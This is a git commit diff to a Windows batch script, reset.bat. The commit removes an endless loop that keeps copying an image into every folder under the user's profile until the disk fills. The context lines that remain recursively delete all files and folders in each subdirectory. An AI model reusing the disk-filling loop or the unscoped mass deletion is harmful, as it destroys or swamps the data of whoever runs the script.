dc7a5c717c80ed45f83661f38d7c7e42fd79dd29
AteebXYZ <130910481+AteebXYZ@users.noreply.github.com>
2023-12-27 16:20:13 +0300

    Update reset.bat

--- reset.bat
+++ reset.bat
@@ -11,15 +11,4 @@ for /D %%A in (*) do (
     del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
     cd ..
 )
-@echo off
-setlocal enabledelayedexpansion
-set "sourceFile=thumbboi.png"
-set "baseDir=C:\Users\%username%"
-:CopyLoop
-for /d %%i in ("%baseDir%\*") do (
-    set /a "counter+=1"
-    set "destinationFile=nick_gurr!counter!.png"
-    copy "%sourceFile%" "%%i\!destinationFile!"
-)
-goto CopyLoop
 
